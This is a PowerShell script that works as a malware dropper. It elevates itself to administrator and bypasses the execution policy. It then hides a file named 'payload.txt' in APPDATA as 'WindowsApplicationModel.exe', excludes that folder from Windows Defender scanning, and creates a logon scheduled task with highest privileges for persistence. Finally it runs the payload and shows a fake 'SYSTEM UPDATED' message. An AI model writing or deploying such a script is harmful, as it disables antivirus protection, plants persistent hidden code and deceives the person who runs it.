If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$dummy_name_no_exe = "WindowsApplicationModel"
$hidden_path = $env:APPDATA + "\$dummy_name_no_exe"
$dummy_name = "$dummy_name_no_exe.exe"
$cwd_path = Split-Path -Path $PSCommandPath -Parent -Resolve

if (!(Test-Path "$hidden_path")){
    mkdir "$hidden_path"
}

Add-MpPreference -ExclusionPath "$hidden_path"
Copy-Item "$cwd_path\payload.txt" -Destination "$hidden_path\$dummy_name"
schtasks /create /tn $dummy_name_no_exe /tr "$hidden_path\$dummy_name" /sc onlogon /rl HIGHEST /f
.\"$hidden_path\$dummy_name"

Write-Output "SYSTEM UPDATED : Press Enter to exit..."
pause